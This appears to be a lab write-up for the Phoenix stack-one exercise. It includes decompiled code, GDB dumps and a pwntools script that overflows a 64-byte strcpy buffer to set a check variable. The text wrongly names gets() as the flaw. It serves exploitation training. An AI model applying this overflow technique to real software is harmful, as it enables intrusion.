# &#35; stack-1

#### &#42; pseudocode using ghidra
```bash

void main(int param_1,int param_2)

{
  undefined *puVar1;
  undefined auStack96 [12];
  undefined local_54 [64];
  int local_14;
  undefined4 *puStack16;
  
  puStack16 = &param_1;
  puts("Welcome to phoenix/stack-one, brought to you by https://exploit.education");
  puVar1 = auStack96;
  if (param_1 < 2) {
    puVar1 = &stack0xffffff90;
    errx();
  }
  local_14 = 0;
  *(undefined4 *)(puVar1 + -0xc) = *(undefined4 *)(param_2 + 4);
  *(undefined **)(puVar1 + -0x10) = local_54;
  *(undefined4 *)(puVar1 + -0x14) = 0x8048569;
  strcpy(*(char **)(puVar1 + -0x10),*(char **)(puVar1 + -0xc));
  if (local_14 == 0x496c5962) {
    *(char **)(puVar1 + -0x10) =
         "Well done, you have successfully set changeme to the correct value";
    *(undefined4 *)(puVar1 + -0x14) = 0x8048583;
    puts(*(char **)(puVar1 + -0x10));
  }
  else {
    *(int *)(puVar1 + -0xc) = local_14;
    *(char **)(puVar1 + -0x10) =
         "Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n";
    *(undefined4 *)(puVar1 + -0x14) = 0x8048599;
    printf(*(char **)(puVar1 + -0x10));
  }
  *(undefined4 *)(puVar1 + -0x10) = 0;
                    /* WARNING: Subroutine does not return */
  *(undefined4 *)(puVar1 + -0x14) = 0x80485a6;
  exit(*(int *)(puVar1 + -0x10));
}
```

#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-one
/opt/phoenix/i486/stack-one: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-one
 [*] '/opt/phoenix/i486/stack-one'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/stack-one
Welcome to phoenix/stack-one, brought to you by https://exploit.education
stack-one: specify an argument, to be copied into the "buffer"

$ /opt/phoenix/i486/stack-one aaaa
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962

```


#### &#42; vulnerable point
#### buffer overflow on gets()
```bash
#### we can overwrite local_14 variable using argv[1]

```


#### &#42; stack structure
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-one -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-one...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048515 <+0>:	lea    ecx,[esp+0x4]
   0x08048519 <+4>:	and    esp,0xfffffff0
   0x0804851c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804851f <+10>:	push   ebp
   0x08048520 <+11>:	mov    ebp,esp
   0x08048522 <+13>:	push   ebx
   0x08048523 <+14>:	push   ecx
   0x08048524 <+15>:	sub    esp,0x50
   0x08048527 <+18>:	mov    ebx,ecx
   0x08048529 <+20>:	sub    esp,0xc
   0x0804852c <+23>:	push   0x80485f0
   0x08048531 <+28>:	call   0x8048340 <puts@plt>
   0x08048536 <+33>:	add    esp,0x10
   0x08048539 <+36>:	cmp    DWORD PTR [ebx],0x1
   0x0804853c <+39>:	jg     0x804854d <main+56>
   0x0804853e <+41>:	sub    esp,0x8
   0x08048541 <+44>:	push   0x804863c
   0x08048546 <+49>:	push   0x1
   0x08048548 <+51>:	call   0x8048350 <errx@plt>
   0x0804854d <+56>:	mov    DWORD PTR [ebp-0xc],0x0    => local_14 = 0
   0x08048554 <+63>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048557 <+66>:	add    eax,0x4
   0x0804855a <+69>:	mov    eax,DWORD PTR [eax]
   0x0804855c <+71>:	sub    esp,0x8
   0x0804855f <+74>:	push   eax
   0x08048560 <+75>:	lea    eax,[ebp-0x4c]             => local_54 [64]
   0x08048563 <+78>:	push   eax
   0x08048564 <+79>:	call   0x8048320 <strcpy@plt>
   0x08048569 <+84>:	add    esp,0x10
   0x0804856c <+87>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804856f <+90>:	cmp    eax,0x496c5962
   0x08048574 <+95>:	jne    0x8048588 <main+115>
   0x08048576 <+97>:	sub    esp,0xc
   0x08048579 <+100>:	push   0x8048670
   0x0804857e <+105>:	call   0x8048340 <puts@plt>
   0x08048583 <+110>:	add    esp,0x10
   0x08048586 <+113>:	jmp    0x804859c <main+135>
   0x08048588 <+115>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804858b <+118>:	sub    esp,0x8
   0x0804858e <+121>:	push   eax
   0x0804858f <+122>:	push   0x80486b4
   0x08048594 <+127>:	call   0x8048330 <printf@plt>
   0x08048599 <+132>:	add    esp,0x10
   0x0804859c <+135>:	sub    esp,0xc
   0x0804859f <+138>:	push   0x0
   0x080485a1 <+140>:	call   0x8048360 <exit@plt>
End of assembler dump.
gef> x/s 0x804863c
0x804863c:	"specify an argument, to be copied into the \"buffer\""
gef>


gef> x/4xw $ebp-0xc
0xffffd68c:	0x00000000	0xffffd6b0	0xf7ffb000	0xffffd730
gef> x/24xw $ebp-0x4c
0xffffd64c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd65c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd68c:	0x00000000	0xffffd6b0	0xf7ffb000	0xffffd730
0xffffd69c:	0xf7f8f654	0xffffd724	0x00000002	0xffffd730


```

#### &#42; payload
```bash
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
payload  = b""
payload += b"A"*64
payload += p32(0x496c5962)
```

#### &#42; exploit code
```bash
$ cat exp_stack1.py
from pwn import *

context.arch='i386'
context.log_level='debug'

filename="/opt/phoenix/i486/stack-one"

payload  = b""
payload += b"A"*64
payload += p32(0x496c5962)

conn = process([filename, payload])
print( conn.recvline() )

conn.interactive()



$ python exp_stack1.py
[+] Starting local process '/opt/phoenix/i486/stack-one' argv=['/opt/phoenix/i486/stack-one', 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI'] : pid 451
[*] Process '/opt/phoenix/i486/stack-one' stopped with exit code 0 (pid 451)
[DEBUG] Received 0x8d bytes:
    'Welcome to phoenix/stack-one, brought to you by https://exploit.education\n'
    'Well done, you have successfully set changeme to the correct value\n'
Welcome to phoenix/stack-one, brought to you by https://exploit.education

[*] Switching to interactive mode
Well done, you have successfully set changeme to the correct value
[*] Got EOF while reading in interactive
$

```


